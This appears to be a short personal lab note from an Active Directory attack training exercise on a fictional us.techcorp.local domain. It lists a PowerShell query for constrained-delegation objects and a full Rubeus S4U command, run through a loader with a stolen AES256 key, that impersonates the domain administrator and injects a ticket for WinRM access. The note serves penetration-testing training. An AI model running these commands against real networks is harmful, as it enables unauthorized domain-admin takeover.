
Task 

• Abuse Constrained delegation in us.techcorp.local to escalate privileges on a machine to Domain Admin.


Enumerate the objects in our current domain that have constrained delegation enabled with the help of the Active Directory module from InvisiShell:

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

![[Pasted image 20250318190523.png]]

Recall that we extracted credentials of appsvc from us-jump, let’s use the AES256 keys for appsvc to impersonate the domain administrator - administrator and access us-mssql using those privileges. Note that we request an alternate ticket for HTTP service to be able to use WinRM.

```
echo %Pwn s4u
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local/altservice:HTTP /domain:us.techcorp.local /ptt
```

![[Pasted image 20250318190927.png]]

